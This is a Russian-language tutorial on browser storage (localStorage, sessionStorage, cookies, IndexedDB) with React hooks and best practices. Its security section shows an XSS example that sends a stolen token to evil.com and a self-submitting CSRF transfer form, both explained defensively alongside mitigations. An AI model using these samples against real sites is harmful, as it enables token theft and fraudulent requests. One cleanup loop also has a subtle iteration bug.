# Локальные хранилища данных — глубокое погружение

## Содержание

1. [Что такое клиентское хранилище и зачем оно нужно](#что-такое-клиентское-хранилище-и-зачем-оно-нужно)
2. [Web Storage API: localStorage и sessionStorage](#web-storage-api-localstorage-и-sessionstorage)
3. [Cookies — старое, но живое](#cookies--старое-но-живое)
4. [IndexedDB — полноценная база данных в браузере](#indexeddb--полноценная-база-данных-в-браузере)
5. [Сравнение технологий](#сравнение-технологий)
6. [Интеграция с React](#интеграция-с-react)
7. [Безопасность и приватность](#безопасность-и-приватность)
8. [Ограничения и подводные камни](#ограничения-и-подводные-камни)
9. [Лучшие практики](#лучшие-практики)
10. [Антипаттерны](#антипаттерны)

---

## Что такое клиентское хранилище и зачем оно нужно

Клиентское хранилище — это механизм сохранения данных на стороне пользователя (в браузере), который позволяет приложению работать даже без подключения к серверу, сохранять состояние между сессиями и уменьшать количество сетевых запросов.

### Зачем это нужно

Представьте несколько типичных сценариев:

**1. Сохранение состояния приложения.** Пользователь заполнил длинную форму, но случайно закрыл вкладку. Без локального хранилища все данные потеряются. С хранилищем — можно автосохранять черновик и восстановить его при следующем визите.

**2. Офлайн-режим.** Пользователь в метро, где нет стабильного интернета. Приложение может показать кэшированные данные из локального хранилища, а синхронизировать их при появлении связи.

**3. Кэширование данных.** Загрузка данных с сервера занимает время. Если данные не меняются часто (например, список стран или курсы валют), их можно сохранить локально и использовать при следующих посещениях без повторного запроса.

**4. Аутентификация.** Токены доступа (JWT) часто хранятся в localStorage или cookies, чтобы пользователь оставался авторизованным после перезагрузки страницы.

**5. Персонализация.** Тема оформления, язык интерфейса, настройки уведомлений — всё это можно сохранить локально, чтобы не запрашивать у сервера при каждом визите.

### Аналогия

Представьте, что вы работаете в офисе:

- **Сервер** — это центральный архив компании (далеко, нужно идти или звонить)
- **Клиентское хранилище** — это ваш рабочий стол (всё под рукой, но ограничено место)

Вы можете:
- Держать на столе часто используемые документы (кэш)
- Сохранять черновики в ящик стола (localStorage)
- Иметь личный сейф с важными документами (IndexedDB)
- Оставлять записки коллегам (cookies — видны другим)

Когда вы уходите домой (закрываете браузер), всё на столе остаётся (localStorage), но черновики на Sticky notes выбрасываются (sessionStorage).

---

## Web Storage API: localStorage и sessionStorage

Web Storage API — это самый простой способ сохранить данные в браузере. Появился в HTML5 и поддерживается всеми современными браузерами.

### localStorage

**localStorage** — это хранилище, которое сохраняет данные **бессрочно** (пока вы явно их не удалите). Данные не удаляются при закрытии браузера или перезагрузке компьютера.

#### Базовое использование

```js
// Сохранение данных
localStorage.setItem('username', 'Alice');
localStorage.setItem('theme', 'dark');

// Чтение данных
const username = localStorage.getItem('username'); // 'Alice'
const theme = localStorage.getItem('theme'); // 'dark'

// Удаление конкретного ключа
localStorage.removeItem('username');

// Очистка всего хранилища
localStorage.clear();
```

#### Важные особенности

**1. Данные хранятся как строки.** Если вы хотите сохранить объект, его нужно сериализовать в JSON:

```js
// ❌ Неправильно — объект превратится в строку "[object Object]"
localStorage.setItem('user', { name: 'Alice', age: 30 });

// ✅ Правильно — сериализуем в JSON
const user = { name: 'Alice', age: 30 };
localStorage.setItem('user', JSON.stringify(user));

// Чтение и десериализация
const storedUser = localStorage.getItem('user');
const parsedUser = JSON.parse(storedUser); // { name: 'Alice', age: 30 }
```

**2. Ограничение размера.** Обычно 5-10 МБ на домен (зависит от браузера). Это достаточно для текстовых данных, но мало для изображений или больших файлов.

**3. Синхронный API.** Операции чтения/записи блокируют основной поток. Для больших объёмов данных это может вызвать подтормаживания.

**4. Синхронизация между вкладками.** Когда вы изменяете localStorage в одной вкладке, событие `storage` срабатывает во всех других вкладках того же домена:

```js
window.addEventListener('storage', (event) => {
  console.log('Ключ:', event.key);
  console.log('Старое значение:', event.oldValue);
  console.log('Новое значение:', event.newValue);
});
```

Это можно использовать для синхронизации состояния между вкладками (например, для реализации logout во всех вкладках при выходе из одной).

#### Практические примеры

**Сохранение темы оформления:**

```js
// Сохранение при изменении темы
function setTheme(theme) {
  localStorage.setItem('theme', theme);
  document.documentElement.setAttribute('data-theme', theme);
}

// Восстановление при загрузке страницы
const savedTheme = localStorage.getItem('theme') || 'light';
document.documentElement.setAttribute('data-theme', savedTheme);
```

**Сохранение черновика формы:**

```jsx
function ContactForm() {
  const [message, setMessage] = useState(() => {
    return localStorage.getItem('draft') || '';
  });

  useEffect(() => {
    const timer = setTimeout(() => {
      localStorage.setItem('draft', message);
    }, 500); // Автосохранение через 500мс после последнего изменения

    return () => clearTimeout(timer);
  }, [message]);

  const handleSubmit = () => {
    // Отправка формы...
    localStorage.removeItem('draft'); // Удаление черновика после успешной отправки
  };

  return (
    <textarea
      value={message}
      onChange={(e) => setMessage(e.target.value)}
      placeholder="Введите сообщение..."
    />
  );
}
```

### sessionStorage

**sessionStorage** работает точно так же, как localStorage, но с одним ключевым отличием: **данные удаляются при закрытии вкладки** (или браузера).

#### Когда использовать sessionStorage

**1. Временные данные.** Данные, которые нужны только в рамках текущей сессии (например, состояние многошаговой формы).

**2. Изоляция между вкладками.** Если вы открыли сайт в двух вкладках, sessionStorage в каждой вкладке будет независимым. Это полезно, если вы не хотите, чтобы действия в одной вкладке влияли на другую.

**3. Чувствительные данные.** Токены или временные ключи, которые должны исчезнуть после закрытия вкладки.

#### Пример использования

```js
// Сохранение состояния многошаговой формы
function saveFormStep(step, data) {
  sessionStorage.setItem(`form_step_${step}`, JSON.stringify(data));
}

// Восстановление при возврате на шаг
function loadFormStep(step) {
  const data = sessionStorage.getItem(`form_step_${step}`);
  return data ? JSON.parse(data) : null;
}

// Очистка после завершения формы
function clearFormSteps() {
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    if (key.startsWith('form_step_')) {
      sessionStorage.removeItem(key);
    }
  }
}
```

### Сравнение localStorage и sessionStorage

| Характеристика | localStorage | sessionStorage |
|---|---|---|
| Время жизни | Бессрочно (до явного удаления) | До закрытия вкладки |
| Область видимости | Все вкладки одного домена | Только текущая вкладка |
| Размер | 5-10 МБ на домен | 5-10 МБ на домен |
| Синхронизация между вкладками | Да (событие `storage`) | Нет |
| Отправка в HTTP-запросах | Нет | Нет |

### Когда что использовать

**Используйте localStorage, если:**
- Данные должны сохраняться между сессиями (тема, язык, настройки)
- Вы кэшируете данные для ускорения загрузки
- Данные не чувствительные (не токены доступа)

**Используйте sessionStorage, если:**
- Данные нужны только в рамках текущей сессии
- Вы хотите изолировать состояние между вкладками
- Данные чувствительные и должны исчезнуть после закрытия вкладки

---

## Cookies — старое, но живое

Cookies — это самый старый механизм клиентского хранилища (появился в 1994 году). Изначально они создавались для хранения состояния на сервере, но со временем стали использоваться и для клиентских данных.

### Как работают cookies

Cookies — это небольшие фрагменты данных (до 4 КБ), которые браузер автоматически отправляет на сервер с каждым HTTP-запросом к соответствующему домену.

```
HTTP-запрос с cookies:
GET /api/users HTTP/1.1
Host: example.com
Cookie: session_id=abc123; theme=dark; lang=ru
```

Сервер может прочитать эти cookies и использовать их для идентификации пользователя или сохранения состояния.

### Базовое использование

```js
// Установка cookie (через document.cookie)
document.cookie = 'username=Alice; path=/; max-age=3600';

// Чтение всех cookies
const allCookies = document.cookie;
// "username=Alice; theme=dark; lang=ru"

// Удаление cookie (устанавливаем срок действия в прошлое)
document.cookie = 'username=; path=/; max-age=0';
```

### Атрибуты cookies

Cookies имеют множество атрибутов, которые контролируют их поведение:

**1. `max-age`** — время жизни в секундах (альтернатива `expires`).

```js
// Cookie живёт 1 час
document.cookie = 'token=abc123; max-age=3600';
```

**2. `expires`** — дата истечения (устаревший способ, но всё ещё используется).

```js
const date = new Date();
date.setTime(date.getTime() + 3600 * 1000); // +1 час
document.cookie = `token=abc123; expires=${date.toUTCString()}`;
```

**3. `path`** — путь, для которого cookie действителен.

```js
// Cookie доступен только для /admin
document.cookie = 'admin_token=xyz; path=/admin';
```

**4. `domain`** — домен, для которого cookie действителен.

```js
// Cookie доступен для всех поддоменов example.com
document.cookie = 'session=abc; domain=.example.com';
```

**5. `secure`** — cookie отправляется только по HTTPS.

```js
// Cookie отправляется только по защищённому соединению
document.cookie = 'token=abc123; secure';
```

**6. `HttpOnly`** — cookie недоступен из JavaScript (защита от XSS).

```js
// Устанавливается только сервером, не через document.cookie
// Set-Cookie: token=abc123; HttpOnly
```

**7. `SameSite`** — контролирует отправку cookie межсайтовых запросов (защита от CSRF).

```js
// Cookie не отправляется при межсайтовых запросах
document.cookie = 'session=abc; SameSite=Strict';

// Cookie отправляется только при переходе с другого сайта (не для AJAX/fetch)
document.cookie = 'session=abc; SameSite=Lax';

// Cookie отправляется везде (требует Secure)
document.cookie = 'session=abc; SameSite=None; Secure';
```

### Типы cookies

**Session cookies** — удаляются при закрытии браузера (не имеют `max-age` или `expires`).

```js
document.cookie = 'session_id=abc123'; // Удалится при закрытии браузера
```

**Persistent cookies** — сохраняются до истечения срока действия.

```js
document.cookie = 'remember_me=true; max-age=31536000'; // Живёт 1 год
```

**Secure cookies** — отправляются только по HTTPS.

```js
document.cookie = 'auth_token=xyz; secure';
```

**HttpOnly cookies** — недоступны из JavaScript (устанавливаются только сервером).

```
Set-Cookie: session_id=abc123; HttpOnly
```

### Когда использовать cookies

**Используйте cookies, если:**
- Вам нужно аутентифицировать пользователя на сервере (session cookies)
- Данные должны автоматически отправляться с каждым запросом
- Вам нужна защита от XSS (HttpOnly cookies)
- Вы работаете с legacy-системами

**Не используйте cookies, если:**
- Данные не нужны на сервере (используйте localStorage)
- Вам нужно хранить большие объёмы данных (ограничение 4 КБ)
- Вы хотите избежать отправки данных с каждым запросом (экономия трафика)

### Пример: аутентификация через cookies

```js
// Клиент: отправка токена в cookie
function setAuthToken(token) {
  document.cookie = `auth_token=${token}; path=/; secure; samesite=strict`;
}

// Сервер: чтение cookie (Node.js + Express)
app.get('/api/me', (req, res) => {
  const token = req.cookies.auth_token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  
  const user = verifyToken(token);
  res.json({ user });
});
```

---

## IndexedDB — полноценная база данных в браузере

IndexedDB — это **низкоуровневый API для хранения структурированных данных** в браузере. Это полноценная NoSQL-база данных, которая поддерживает транзакции, индексы, курсоры и большие объёмы данных.

### Зачем нужен IndexedDB

localStorage и cookies подходят для простых данных (строки, числа, небольшие объекты). Но что если вам нужно:

- Хранить большие объёмы данных (сотни мегабайт или даже гигабайты)
- Работать со структурированными данными (массивы объектов, бинарные данные)
- Выполнять сложные запросы (поиск по индексу, сортировка, фильтрация)
- Использовать транзакции для обеспечения целостности данных

Для этого и нужен IndexedDB.

### Основные концепции

**1. База данных.** IndexedDB создаёт базу данных для каждого домена. База данных содержит **object stores** (аналог таблиц в SQL).

**2. Object Store.** Хранилище объектов — это коллекция записей. Каждая запись имеет ключ и значение (обычно объект).

**3. Транзакции.** Все операции чтения/записи выполняются в рамках транзакции. Транзакции обеспечивают целостность данных и изоляцию.

**4. Индексы.** Индексы позволяют быстро искать записи по определённым полям (аналогично индексам в SQL).

**5. Асинхронный API.** Все операции асинхронные, чтобы не блокировать основной поток.

### Базовое использование

#### Открытие базы данных

```js
const request = indexedDB.open('MyDatabase', 1);

// База данных успешно открыта
request.onsuccess = (event) => {
  const db = event.target.result;
  console.log('База данных открыта');
};

// Ошибка при открытии
request.onerror = (event) => {
  console.error('Ошибка открытия БД:', event.target.error);
};

// База данных ещё не существовала или версия изменилась
request.onupgradeneeded = (event) => {
  const db = event.target.result;
  
  // Создаём object store "users" с ключом "id"
  if (!db.objectStoreNames.contains('users')) {
    const userStore = db.createObjectStore('users', { keyPath: 'id' });
    
    // Создаём индекс по полю "email"
    userStore.createIndex('email', 'email', { unique: true });
  }
};
```

#### Добавление данных

```js
function addUser(db, user) {
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  const request = store.add(user);
  
  request.onsuccess = () => {
    console.log('Пользователь добавлен');
  };
  
  request.onerror = () => {
    console.error('Ошибка добавления:', request.error);
  };
}

// Использование
addUser(db, { id: 1, name: 'Alice', email: 'alice@example.com', age: 30 });
```

#### Чтение данных

```js
function getUser(db, userId) {
  const transaction = db.transaction(['users'], 'readonly');
  const store = transaction.objectStore('users');
  
  const request = store.get(userId);
  
  request.onsuccess = () => {
    const user = request.result;
    if (user) {
      console.log('Найден пользователь:', user);
    } else {
      console.log('Пользователь не найден');
    }
  };
}

// Использование
getUser(db, 1);
```

#### Поиск по индексу

```js
function getUserByEmail(db, email) {
  const transaction = db.transaction(['users'], 'readonly');
  const store = transaction.objectStore('users');
  const index = store.index('email');
  
  const request = index.get(email);
  
  request.onsuccess = () => {
    const user = request.result;
    console.log('Найден пользователь по email:', user);
  };
}

// Использование
getUserByEmail(db, 'alice@example.com');
```

#### Обновление данных

```js
function updateUser(db, userId, updates) {
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  const getRequest = store.get(userId);
  
  getRequest.onsuccess = () => {
    const user = getRequest.result;
    const updatedUser = { ...user, ...updates };
    
    const putRequest = store.put(updatedUser);
    
    putRequest.onsuccess = () => {
      console.log('Пользователь обновлён');
    };
  };
}

// Использование
updateUser(db, 1, { age: 31 });
```

#### Удаление данных

```js
function deleteUser(db, userId) {
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  const request = store.delete(userId);
  
  request.onsuccess = () => {
    console.log('Пользователь удалён');
  };
}

// Использование
deleteUser(db, 1);
```

#### Итерация по всем записям

```js
function getAllUsers(db) {
  const transaction = db.transaction(['users'], 'readonly');
  const store = transaction.objectStore('users');
  
  const request = store.openCursor();
  const users = [];
  
  request.onsuccess = (event) => {
    const cursor = event.target.result;
    
    if (cursor) {
      users.push(cursor.value);
      cursor.continue(); // Переход к следующей записи
    } else {
      console.log('Все пользователи:', users);
    }
  };
}

// Использование
getAllUsers(db);
```

### Упрощение работы с IndexedDB

Нативный API IndexedDB очень многословный и сложный. Поэтому появились библиотеки-обёртки, которые упрощают работу.

#### idb — современная Promise-based обёртка

```js
import { openDB } from 'idb';

// Открытие БД
const db = await openDB('MyDatabase', 1, {
  upgrade(db) {
    const store = db.createObjectStore('users', { keyPath: 'id' });
    store.createIndex('email', 'email', { unique: true });
  },
});

// Добавление
await db.put('users', { id: 1, name: 'Alice', email: 'alice@example.com' });

// Чтение
const user = await db.get('users', 1);

// Поиск по индексу
const userByEmail = await db.getFromIndex('users', 'email', 'alice@example.com');

// Получение всех записей
const allUsers = await db.getAll('users');

// Удаление
await db.delete('users', 1);
```

#### Dexie.js — ещё более высокоуровневая библиотека

```js
import Dexie from 'dexie';

// Определение БД
const db = new Dexie('MyDatabase');
db.version(1).stores({
  users: 'id, name, email, age'
});

// Добавление
await db.users.add({ id: 1, name: 'Alice', email: 'alice@example.com', age: 30 });

// Чтение
const user = await db.users.get(1);

// Поиск
const youngUsers = await db.users.where('age').below(35).toArray();

// Обновление
await db.users.update(1, { age: 31 });

// Удаление
await db.users.delete(1);
```

### Когда использовать IndexedDB

**Используйте IndexedDB, если:**
- Вам нужно хранить большие объёмы данных (> 5 МБ)
- Вы работаете со структурированными данными (массивы объектов)
- Вам нужны сложные запросы (поиск по индексу, фильтрация, сортировка)
- Вы строите офлайн-приложение (PWA)
- Вы кэшируете файлы, изображения или другие бинарные данные

**Не используйте IndexedDB, если:**
- Вам нужно хранить простые данные (используйте localStorage)
- Данные должны отправляться на сервер с каждым запросом (используйте cookies)
- Вам нужна синхронизация между устройствами (используйте серверное хранилище)

---

## Сравнение технологий

### Таблица сравнения

| Характеристика | localStorage | sessionStorage | Cookies | IndexedDB |
|---|---|---|---|---|
| Размер | 5-10 МБ | 5-10 МБ | 4 КБ | До нескольких ГБ |
| Время жизни | Бессрочно | До закрытия вкладки | Настраивается | Бессрочно |
| Область видимости | Все вкладки домена | Только текущая вкладка | Все вкладки домена | Все вкладки домена |
| Отправка на сервер | Нет | Нет | Автоматически | Нет |
| Тип данных | Строки | Строки | Строки | Любые (объекты, бинарные данные) |
| Индексы | Нет | Нет | Нет | Да |
| Транзакции | Нет | Нет | Нет | Да |
| API | Синхронный | Синхронный | Синхронный | Асинхронный |
| Поддержка | Все браузеры | Все браузеры | Все браузеры | Все современные браузеры |

### Когда что использовать

**localStorage:**
- Настройки пользователя (тема, язык)
- Кэш небольших данных
- Черновики форм
- Токены аутентификации (если не нужна отправка на сервер)

**sessionStorage:**
- Временные данные в рамках сессии
- Состояние многошаговых форм
- Данные, которые должны исчезнуть при закрытии вкладки

**Cookies:**
- Аутентификация на сервере (session cookies)
- Данные, которые должны автоматически отправляться с каждым запросом
- Защита от XSS (HttpOnly cookies)
- Совместимость с legacy-системами

**IndexedDB:**
- Офлайн-приложения (PWA)
- Кэширование больших объёмов данных
- Структурированные данные с необходимостью поиска
- Хранение файлов и бинарных данных
- Сложные клиентские базы данных

### Комбинированное использование

В реальных приложениях часто используется несколько технологий одновременно:

```js
// Пример: приложение с аутентификацией и офлайн-режимом

// 1. Токен аутентификации в cookies (автоматически отправляется на сервер)
document.cookie = 'auth_token=abc123; secure; samesite=strict';

// 2. Настройки пользователя в localStorage (сохраняются между сессиями)
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'ru');

// 3. Временные данные формы в sessionStorage
sessionStorage.setItem('form_draft', JSON.stringify(draftData));

// 4. Кэш данных и офлайн-хранилище в IndexedDB
const db = await openDB('AppCache', 1, {
  upgrade(db) {
    db.createObjectStore('posts', { keyPath: 'id' });
    db.createObjectStore('media', { keyPath: 'id' });
  }
});

// Кэширование постов для офлайн-режима
await db.put('posts', { id: 1, title: 'Hello', content: 'World' });
```

---

## Интеграция с React

Работа с клиентскими хранилищами в React требует учёта жизненного цикла компонентов и побочных эффектов.

### Хук для localStorage

```jsx
import { useState, useEffect } from 'react';

function useLocalStorage(key, initialValue) {
  // initialState — функция, чтобы не вызывать JSON.stringify при каждом рендере
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error('Ошибка чтения localStorage:', error);
      return initialValue;
    }
  });

  // setValue — обновляет и localStorage, и состояние
  const setValue = (value) => {
    try {
      const valueToStore = value instanceof Function ? value(storedValue) : value;
      setStoredValue(valueToStore);
      localStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error('Ошибка записи в localStorage:', error);
    }
  };

  return [storedValue, setValue];
}

// Использование
function ThemeToggle() {
  const [theme, setTheme] = useLocalStorage('theme', 'light');

  const toggleTheme = () => {
    setTheme((prev) => (prev === 'light' ? 'dark' : 'light'));
  };

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme);
  }, [theme]);

  return (
    <button onClick={toggleTheme}>
      Current theme: {theme}
    </button>
  );
}
```

### Хук для sessionStorage

```jsx
import { useState } from 'react';

function useSessionStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = sessionStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error('Ошибка чтения sessionStorage:', error);
      return initialValue;
    }
  });

  const setValue = (value) => {
    try {
      const valueToStore = value instanceof Function ? value(storedValue) : value;
      setStoredValue(valueToStore);
      sessionStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error('Ошибка записи в sessionStorage:', error);
    }
  };

  return [storedValue, setValue];
}

// Использование
function MultiStepForm() {
  const [formData, setFormData] = useSessionStorage('form_draft', {
    step1: null,
    step2: null,
    step3: null,
  });

  const updateStep = (step, data) => {
    setFormData((prev) => ({ ...prev, [step]: data }));
  };

  return (
    <div>
      <Step1 data={formData.step1} onSave={(data) => updateStep('step1', data)} />
      <Step2 data={formData.step2} onSave={(data) => updateStep('step2', data)} />
      <Step3 data={formData.step3} onSave={(data) => updateStep('step3', data)} />
    </div>
  );
}
```

### Хук для cookies

```jsx
import { useState, useEffect } from 'react';

function useCookie(name, initialValue) {
  const [value, setValue] = useState(() => {
    const cookieValue = document.cookie
      .split('; ')
      .find((row) => row.startsWith(`${name}=`))
      ?.split('=')[1];
    
    return cookieValue ? decodeURIComponent(cookieValue) : initialValue;
  });

  useEffect(() => {
    const cookieString = `${name}=${encodeURIComponent(value)}; path=/; max-age=31536000`;
    document.cookie = cookieString;
  }, [name, value]);

  return [value, setValue];
}

// Использование
function UserPreferences() {
  const [language, setLanguage] = useCookie('language', 'en');

  return (
    <select value={language} onChange={(e) => setLanguage(e.target.value)}>
      <option value="en">English</option>
      <option value="ru">Русский</option>
      <option value="es">Español</option>
    </select>
  );
}
```

### Хук для IndexedDB (с idb)

```jsx
import { useState, useEffect } from 'react';
import { openDB } from 'idb';

function useIndexedDB(storeName) {
  const [db, setDb] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const initDB = async () => {
      const database = await openDB('MyApp', 1, {
        upgrade(db) {
          if (!db.objectStoreNames.contains(storeName)) {
            db.createObjectStore(storeName, { keyPath: 'id' });
          }
        },
      });
      setDb(database);
      setLoading(false);
    };

    initDB();
  }, [storeName]);

  const add = async (item) => {
    if (!db) return;
    await db.add(storeName, item);
  };

  const get = async (key) => {
    if (!db) return null;
    return await db.get(storeName, key);
  };

  const getAll = async () => {
    if (!db) return [];
    return await db.getAll(storeName);
  };

  const update = async (item) => {
    if (!db) return;
    await db.put(storeName, item);
  };

  const remove = async (key) => {
    if (!db) return;
    await db.delete(storeName, key);
  };

  return { add, get, getAll, update, remove, loading };
}

// Использование
function PostList() {
  const { getAll, add, remove, loading } = useIndexedDB('posts');
  const [posts, setPosts] = useState([]);

  useEffect(() => {
    const loadPosts = async () => {
      const allPosts = await getAll();
      setPosts(allPosts);
    };
    loadPosts();
  }, [getAll]);

  const handleAddPost = async (post) => {
    await add(post);
    setPosts((prev) => [...prev, post]);
  };

  const handleDeletePost = async (id) => {
    await remove(id);
    setPosts((prev) => prev.filter((p) => p.id !== id));
  };

  if (loading) return <div>Загрузка...</div>;

  return (
    <div>
      {posts.map((post) => (
        <div key={post.id}>
          <h3>{post.title}</h3>
          <button onClick={() => handleDeletePost(post.id)}>Удалить</button>
        </div>
      ))}
    </div>
  );
}
```

---

## Безопасность и приватность

### XSS и localStorage

**Проблема:** localStorage доступен из JavaScript, что делает его уязвимым для XSS-атак. Если злоумышленник может выполнить произвольный JavaScript на вашей странице, он может прочитать все данные из localStorage.

```js
// Злоумышленник может выполнить:
const token = localStorage.getItem('auth_token');
fetch('https://evil.com/steal?token=' + token);
```

**Решение:**
- Не храните чувствительные данные (токены, пароли) в localStorage
- Используйте HttpOnly cookies для токенов аутентификации
- Санитизируйте пользовательский ввод (используйте DOMPurify)
- Настройте Content Security Policy (CSP)

### CSRF и cookies

**Проблема:** Cookies автоматически отправляются с каждым запросом, что делает их уязвимыми для CSRF-атак (Cross-Site Request Forgery).

```
// Злоумышленник создаёт страницу с формой:
<form action="https://yourbank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="hacker_account">
</form>
<script>document.forms[0].submit();</script>
```

Если пользователь авторизован на yourbank.com и cookies отправляются автоматически, запрос будет выполнен.

**Решение:**
- Используйте атрибут `SameSite=Strict` или `SameSite=Lax`
- Используйте CSRF-токены (случайные значения, которые сервер проверяет при каждом запросе)
- Проверяйте `Origin` и `Referer` заголовки на сервере

### Приватность и GDPR

**Проблема:** Хранение персональных данных (email, имя, история действий) подпадает под регулирование GDPR (General Data Protection Regulation) и других законов о приватности.

**Решение:**
- Получайте явное согласие пользователя на хранение данных
- Предоставляйте возможность удалить данные
- Не храните чувствительные данные без необходимости
- Используйте анонимные идентификаторы вместо персональных данных

---

## Ограничения и подводные камни

### Ограничения localStorage

**1. Только строки.** Все данные хранятся как строки. Объекты нужно сериализовать в JSON, что может быть медленно для больших объёмов.

**2. Синхронный API.** Операции блокируют основной поток. Для больших данных это может вызвать подтормаживания.

**3. Ограниченный размер.** Обычно 5-10 МБ на домен. Если вы попытаетесь сохранить больше, браузер выбросит исключение `QuotaExceededError`.

```js
try {
  localStorage.setItem('largeData', 'x'.repeat(10000000)); // 10 МБ
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('Превышен лимит хранилища');
  }
}
```

**4. Нет поддержки в приватном режиме.** В некоторых браузерах (Safari) localStorage может быть недоступен в приватном режиме.

### Ограничения cookies

**1. Ограниченный размер.** Всего 4 КБ на cookie. Это очень мало.

**2. Отправка с каждым запросом.** Cookies автоматически отправляются с каждым HTTP-запросом к домену. Если у вас много cookies, это увеличивает размер запросов и замедляет загрузку.

**3. Сложность API.** Работа с `document.cookie` неудобна. Лучше использовать библиотеки вроде `js-cookie`.

### Ограничения IndexedDB

**1. Сложный API.** Нативный API очень многословный. Используйте библиотеки-обёртки (idb, Dexie).

**2. Асинхронность.** Все операции асинхронные, что усложняет работу в синхронном коде.

**3. Отсутствие поддержки в некоторых браузерах.** IndexedDB не поддерживается в приватном режиме Safari и в некоторых старых браузерах.

---

## Лучшие практики

### 1. Используйте хуки для инкапсуляции работы с хранилищами

Не работайте с localStorage/cookies напрямую в компонентах. Создайте хуки, которые инкапсулируют логику:

```jsx
// ❌ Плохо — прямая работа с localStorage в компоненте
function UserSettings() {
  const [theme, setTheme] = useState(() => {
    return localStorage.getItem('theme') || 'light';
  });

  useEffect(() => {
    localStorage.setItem('theme', theme);
  }, [theme]);

  // ...
}

// ✅ Хорошо — инкапсуляция в хуке
function UserSettings() {
  const [theme, setTheme] = useLocalStorage('theme', 'light');
  // ...
}
```

### 2. Обрабатывайте ошибки

localStorage может быть недоступен (приватный режим, переполнение квоты). Всегда обрабатывайте ошибки:

```jsx
function safeLocalStorageSet(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    console.error('Ошибка записи в localStorage:', error);
    // Fallback: используем переменную в памяти
  }
}
```

### 3. Валидируйте данные при чтении

Данные в localStorage могут быть повреждены или устарели. Валидируйте их при чтении:

```jsx
function useLocalStorage(key, initialValue) {
  const [value, setValue] = useState(() => {
    try {
      const item = localStorage.getItem(key);
      if (!item) return initialValue;
      
      const parsed = JSON.parse(item);
      
      // Валидация структуры данных
      if (typeof parsed !== 'object' || parsed === null) {
        return initialValue;
      }
      
      return parsed;
    } catch (error) {
      return initialValue;
    }
  });

  // ...
}
```

### 4. Используйте версионирование для схемы данных

Если вы храните сложные объекты, добавьте версию, чтобы мигрировать данные при изменении структуры:

```js
function migrateData() {
  const version = localStorage.getItem('data_version') || '1';
  
  if (version === '1') {
    // Миграция с версии 1 на версию 2
    const oldData = JSON.parse(localStorage.getItem('user') || '{}');
    const newData = {
      name: oldData.name,
      email: oldData.email,
      preferences: { theme: oldData.theme || 'light' }
    };
    localStorage.setItem('user', JSON.stringify(newData));
    localStorage.setItem('data_version', '2');
  }
}
```

### 5. Очищайте данные при logout

При выходе пользователя очищайте все чувствительные данные:

```js
function logout() {
  localStorage.removeItem('auth_token');
  localStorage.removeItem('user_data');
  sessionStorage.clear();
  
  // Очистка cookies
  document.cookie = 'session_id=; max-age=0';
  
  // Перенаправление на страницу входа
  window.location.href = '/login';
}
```

### 6. Используйте IndexedDB для больших данных

Если вы храните больше нескольких мегабайт данных, используйте IndexedDB вместо localStorage:

```js
// ❌ Плохо — localStorage для больших данных
localStorage.setItem('posts', JSON.stringify(hugeArrayOfPosts)); // Может превысить квоту

// ✅ Хорошо — IndexedDB для больших данных
const db = await openDB('App', 1, {
  upgrade(db) {
    db.createObjectStore('posts', { keyPath: 'id' });
  }
});
await db.put('posts', post);
```

---

## Антипаттерны

### 1. Хранение токенов в localStorage

**Проблема:** localStorage доступен из JavaScript, что делает его уязвимым для XSS-атак.

```js
// ❌ Плохо — токен в localStorage
localStorage.setItem('auth_token', token);
```

**Решение:** Используйте HttpOnly cookies:

```js
// ✅ Хорошо — токен в HttpOnly cookie (устанавливается сервером)
// Set-Cookie: auth_token=abc123; HttpOnly; Secure; SameSite=Strict
```

### 2. Хранение чувствительных данных

**Проблема:** Пароли, номера кредитных карт, персональные данные не должны храниться локально.

```js
// ❌ Плохо — пароль в localStorage
localStorage.setItem('password', 'secret123');
```

**Решение:** Не храните чувствительные данные локально. Используйте серверное хранилище с шифрованием.

### 3. Отсутствие обработки ошибок

**Проблема:** localStorage может быть недоступен или переполнен.

```js
// ❌ Плохо — без обработки ошибок
localStorage.setItem('data', JSON.stringify(hugeData)); // Может выбросить исключение
```

**Решение:** Обёртывайте в try-catch:

```js
// ✅ Хорошо — с обработкой ошибок
try {
  localStorage.setItem('data', JSON.stringify(hugeData));
} catch (error) {
  console.error('Ошибка записи:', error);
  // Fallback или уведомление пользователя
}
```

### 4. Синхронизация между вкладками без обработки

**Проблема:** Изменение localStorage в одной вкладке не обновляет состояние в других вкладках автоматически.

```js
// ❌ Плохо — состояние не синхронизируется
function App() {
  const [theme, setTheme] = useState(localStorage.getItem('theme'));
  
  // Если пользователь изменит тему в другой вкладке, эта вкладка не узнает
}
```

**Решение:** Слушайте событие `storage`:

```js
// ✅ Хорошо — синхронизация между вкладками
useEffect(() => {
  const handleStorageChange = (event) => {
    if (event.key === 'theme') {
      setTheme(event.newValue);
    }
  };
  
  window.addEventListener('storage', handleStorageChange);
  return () => window.removeEventListener('storage', handleStorageChange);
}, []);
```

### 5. Использование cookies для больших данных

**Проблема:** Cookies ограничены 4 КБ и отправляются с каждым запросом.

```js
// ❌ Плохо — большие данные в cookies
document.cookie = `user_data=${JSON.stringify(hugeObject)}`; // Может превысить 4 КБ
```

**Решение:** Используйте localStorage или IndexedDB:

```js
// ✅ Хорошо — большие данные в localStorage
localStorage.setItem('user_data', JSON.stringify(hugeObject));
```

---

## Заключение

